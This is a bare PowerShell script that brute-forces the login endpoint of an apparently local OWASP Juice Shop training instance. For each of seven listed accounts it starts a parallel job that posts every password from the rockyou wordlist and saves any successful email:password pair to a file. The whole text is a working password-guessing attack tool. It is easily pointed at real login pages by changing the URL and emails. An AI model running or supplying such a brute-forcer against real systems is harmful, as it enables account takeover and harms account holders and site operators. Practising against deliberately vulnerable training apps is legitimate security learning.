cls
$url = 'http://localhost:3000/rest/user/login'
$emails = @('admin@juice-sh.op','jim@juice-sh.op','bender@juice-sh.op','bjoern.kimminich@gmail.com','ciso@juice-sh.op','support@juice-sh.op','morty@juice-sh.op')

# Create a folder for all detected password files
$DPDirectory = New-Item -Name DetectedPasswords -ItemType Directory -Force
# Create a file for each account
$emails | ForEach-Object {
    New-Item -Path DetectedPasswords -Name "$($_).txt" -ItemType File -Force
}

foreach($email in $emails)
{
    Write-Host "Starting job for $email"
    $job = Start-Job -ArgumentList @(,$url,$email) -Name $email -WorkingDirectory $DPDirectory.FullName -ScriptBlock {
        param([string]$url,[string]$email)
        Write-Host "Using: $url"
        Write-Host "Account: $email"
        $outFileStream = (Get-Item -Path "$($email).txt").AppendText()
        Get-Content /usr/share/wordlists/rockyou.txt | ForEach-Object {
            $password = $_
            $payload = @{
                'email' = $email
                'password' = $password
            }
            if((Invoke-WebRequest -Uri $url -Method Post -Body $payload -SkipHttpErrorCheck).StatusCode -eq 200){
                $outFileStream.WriteLine("$($email):$($password)")
                $outFileStream.Flush()
                Write-Host "`t$($password)"
            }
        }
        $outFileStream.Close()
    }
}
